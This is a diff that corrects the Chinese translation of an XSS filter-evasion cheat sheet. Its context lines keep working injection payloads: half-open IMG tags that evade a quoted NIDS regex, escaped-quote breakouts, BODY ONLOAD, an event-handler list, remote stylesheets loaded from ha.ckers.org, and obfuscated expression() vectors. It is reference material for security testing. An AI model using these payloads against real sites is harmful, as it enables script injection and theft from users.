@@ -210,7 +210,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 ----
 ##半开的HTML/JavaScript xss向量##
-不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指定在图片标签中这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以插入这个xss向量在任何html标签后面。甚至没有用">"关闭标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn't require the end ">". 这也是有效的去对付真实的xss过滤器，我曾经碰见过试用半开的<IFRAME 标签替代 <IMG 标签，
+不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指令在IMG标签中，这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以使用这个xss向量在任何html标签中，甚至没有用">"闭合标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn't require the end ">". 它也是有效的去对付真实的xss过滤器，我曾经用半开的<IFRAME 标签替代 <IMG 标签去绕过过滤器。
 
     <IMG SRC="javascript:alert('XSS')"
 
@@ -222,7 +222,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 -----
 ##转义javascript中的转义##
-当一个应用程序是输出用户自定义的信息到javascript代码中，例如： &#x3C;SCRIPT>var a="$ENV{QUERY_STRING}";&#x3C;/SCRIPT>。如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过转义被转义的字符来绕过它。从而使最终的输入代码类似于&#x3C;SCRIPT>var a="\\";alert('XSS');//";&#x3C;/SCRIPT> 。最终\转义了双引号前被服务器添加的\，而双引号则不会被转义，从而触发xss向量。xss定位器使用这个方法。
+当一个应用程序是输出用户自定义的信息到javascript代码中时，例如： &#x3C;SCRIPT>var a="$ENV{QUERY_STRING}";&#x3C;/SCRIPT>。如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过再转义被转义的字符来绕过它。因此使最终的输入代码类似于&#x3C;SCRIPT>var a="\\";alert('XSS');//";&#x3C;/SCRIPT> 。最终\转义了双引号前被服务器添加的\，从而使双引号不会被转义，因此触发xss向量。xss定位器使用这个方法。
 
     \";alert('XSS');//
 
@@ -260,7 +260,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 -----
 ##List-style-image##
-为带有符号的列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为javascript指令。这不是一个特别有用的xss向量。
+为符号列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为使用了javascript指令。这不是一个特别有用的xss向量。
 
     <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
 
@@ -276,7 +276,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 -----
 ##BODY 标签##
-这个方法不需要使用任何"javascript:" or "<SCRIPT..." 的变体去实现xss攻击。Dan Crowley特别指出你可以额外的加入一个空格在等号之前("onload=" != "onload ="):
+这个方法不需要使用任何"javascript:" 或 "<SCRIPT..." 的变体去实现xss攻击。Dan Crowley特别指出你可以额外的加入一个空格在等号之前("onload=" != "onload ="):
 
     <BODY ONLOAD=alert('XSS')>
 
@@ -286,20 +286,20 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
  1. FSCommand() (攻击者可以使用它当执行一个嵌入的flash对象时)
  2. onAbort() (当使用者终止一张正在载入的图片)
- 3. onActivate() (当对象被设置为激活元素)
+ 3. onActivate() (当对象被被设置为激活元素)
  4. onAfterPrint() (用户打印或是预览打印工作后激活)
  5. onAfterUpdate() (激活在一个数据对象当源对象数据更新后)
- 6. onBeforeActivate() (触发在一个对象被设置为激活元素)
- 7. onBeforeCopy() (攻击者执行攻击代码在一个选区被复制到剪贴板之前-攻击者可以实现它通过execCommand("Copy")函数。)
+ 6. onBeforeActivate() (当对象被被设置为激活元素时触发)
+ 7. onBeforeCopy() (攻击者执行攻击代码在一个选区被复制到剪贴板之前-攻击者也可以实现它通过execCommand("Copy")函数。)
  8. onBeforeCut() (攻击者执行攻击代码在在一个选区被剪贴。)
  9. onBeforeDeactivate() (当激活元素被改变后触发)
- 10. onBeforeEditFocus() (触发在一个可被编辑的元素内的对象就按测到一个 UI-activated状态或是一个可被编辑对象被选择之前)
+ 10. onBeforeEditFocus() (触发在一个可被编辑的元素内的对象当其处于一个 UI-activated状态或是一个可被编辑对象被选择之前)
  11. onBeforePaste() (用户需要被欺骗执行粘贴或是去触发它通过execCommand("Paste")函数。)
  12. onBeforePrint() (用户需要被欺骗执行打印或是攻击者可以使用print()或是execCommand("Print")函数。)
  13. onBeforeUnload() (用户需要被欺骗关闭浏览器-攻击者不可以 unload windows除非它是被执行从其父窗口。)
  14. onBeforeUpdate() (激活在数据对象在源对象更新数据之后。)
  15. onBegin() (onbegin 事件被立即触发当元素的声明周期开始后)
- 16. onBlur() (当失去焦点时触发*)
+ 16. onBlur() (当失去焦点时触发)
  17. onBounce() (触发当选框对象的behavior属性被设置为"alternate"或是选框的内容抵达窗口的一边。)
  18. onCellChange() (触发当数据改变在数据provider)
  19. onChange() (select, text, or TEXTAREA 字段失去焦点或是它们的值是被改变。)
@@ -347,10 +347,10 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
  61. onMouseMove() (攻击者需要让用户移动鼠标进入一个图片或是表格上)
  63. onMouseOver() (光标移到一个对象或是区域上)
  64. onMouseUp() (攻击者需要让用户点击一张图片)
- 65. onMouseWheel() (拥挤着需要让用户去使用他们的鼠标滚轮)
+ 65. onMouseWheel() (攻击者需要让用户去使用他们的鼠标滚轮)
  66. onMove() (用户或攻击者需要移动页面)
- 67. onMoveEnd() (用户说攻击者需要移动页面)
- 68. onMoveStart() (用户说攻击者需要移动页面)
+ 67. onMoveEnd() (用户或攻击者需要移动页面)
+ 68. onMoveStart() (用户或攻击者需要移动页面)
  69. onOffline() (浏览器从在线模式转换到离线模式时发生)
  70. onOnline() (浏览器从离线模式转换到在线模式时发生)
  71. onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline)
@@ -406,19 +406,19 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 -----
 ##远程样式表##
-（通过某些方式例如最简单的远程样式表，你可以插入一个样式参数为嵌入表达式的xss代码）。它是仅仅工作在IE浏览器或是使用了IE渲染引擎的Netscape 8.1+。需要注意的是页面中并没有展现出它包含了javascript代码。注意：所有的远程样式表示例需要至少用到body标签，负责将无法工作除非页面中包含除了向量本身的其他内容。因此你需要添加至少一个字母到页面确保他可以工作如果它是一个空白页面。
+（通过某些方式例如最简单的远程样式表，你可以在表达式类型的样式参数中嵌入xss代码）。它是仅仅工作在IE浏览器或是使用了IE渲染引擎的Netscape 8.1+。需要注意的是页面中并没有展现出它包含了javascript代码。注意：所有的远程样式表xss需要至少页面包含body标签，否则将无法工作。或者页面中包含除了向量本身外的其他内容。因此如果它是一个空白页面，你需要添加至少一个字母到页面确保它可以工作。
 
     <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
 
 ------
 ##远程样式表2##
-他的工作原理与上面相同。但是使用了STYLE标签代替LINK标签。榆次向量稍有不同的变异被用于攻击Google Desktop。你可以移除&#x3C;/STYLE>标签当后面的html去闭合它。这个向量是有用的在不允许输入等号或是反斜杠的实际环境中。
+原理与上面相同。但是使用了STYLE标签代替LINK标签。与此向量稍有不同的变异型曾被用于攻击Google Desktop。你也可以移除&#x3C;/STYLE>标签让后面的html去闭合它。在不允许输入等号或是反斜杠的实际环境中这个向量是有用的。
 
     <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
 
 ----
 ##远程样式表3##
-它仅仅可以工作在 Opera 8.0 (no longer in 9.x) ，但是是非常的狡猾。 Opera 8.0 (no longer in 9.x) 。根据RFC2616规定，设置一个连接头不是 HTTP1.1 规定的一部分，但是很多浏览器仍然允许它（例如Firefox and Opera）。这个技巧是我们可以设置一个http头（与常规http头没有什么不同，只是 Link: <http://ha.ckers.org/xss.css>; REL=stylesheet）。这样带有xss代码的远程向量将运行javascript。他并不被支持在 FireFox。
+它仅仅可以工作在 Opera 8.0 (no longer in 9.x) ，但它是非常的阴险。根据RFC2616规定，设置一个http头不是 HTTP1.1 规定的一部分，但是很多浏览器仍然允许它（例如Firefox and Opera）。这个技巧是我们可以设置一个http头（与常规http头没有什么不同，除了 Link: <http://ha.ckers.org/xss.css>; REL=stylesheet）。这样带有xss代码的远程向量将运行javascript。它不被支持在 FireFox。
 
     <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
 
@@ -430,7 +430,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 ------
 ##分隔javascript在STYLE标签##
-这个xss在ie浏览器中会造成无线循环
+这个xss在ie浏览器中会造成无线循环的弹窗
 
     <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 
@@ -442,7 +442,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 ----
 ##IMG样式的表达式##
-这是上面xss向量的混合体。但是它是展示了STYLE标签被分隔有多困难。同样它也会在ie下造成循环弹窗。
+这是上面xss向量的混合体。不过它展示了STYLE标签被分隔有多困难。同样它也会在ie下造成循环弹窗。
 
     exp/*<A STYLE='no\xss:noxss("*//*");
     xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
